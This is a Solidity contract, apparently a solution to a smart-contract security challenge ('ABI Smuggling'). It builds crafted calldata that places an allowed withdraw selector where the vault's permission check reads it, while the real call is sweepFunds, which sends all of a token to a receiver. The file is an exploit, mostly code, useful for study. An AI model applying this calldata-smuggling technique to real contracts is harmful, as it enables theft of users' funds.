// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./AuthorizedExecutor.sol";
import "./SelfAuthorizedVault.sol";


contract ExploitABISmuggling {

    address vault;
    address token;

    constructor(address _vault, address _token) {

        vault = _vault;
        token = _token;
    }

    function buildPayload(address receiver) public view returns (bytes memory) {

        bytes memory payload0 = abi.encodeWithSignature("execute(address,bytes)", vault);
        bytes32 offsetSweep = bytes32(abi.encode(0x80)); // Offset in which the sizeSweep value is located
        bytes32 sizeSweep = bytes32(abi.encode(0x44)); // Length of bytes of the sweepFunds part of the payload
        bytes28 padding = bytes28(0);
        payload0 = bytes.concat(payload0, offsetSweep);
        bytes memory payload1 = abi.encodeWithSignature("withdraw(address,address,uint256)");
        bytes memory payload2 = abi.encodeWithSignature("sweepFunds(address,address)", receiver, token);

        return bytes.concat(payload0, bytes32(0), payload1, padding, sizeSweep, payload2);
    }

    function getActionId() external view returns (bytes32) {

        bytes4 selector = bytes4(abi.encodeWithSignature("withdraw(address,address,uint256)"));
        return SelfAuthorizedVault(vault).getActionId(selector, msg.sender, vault);
    }
}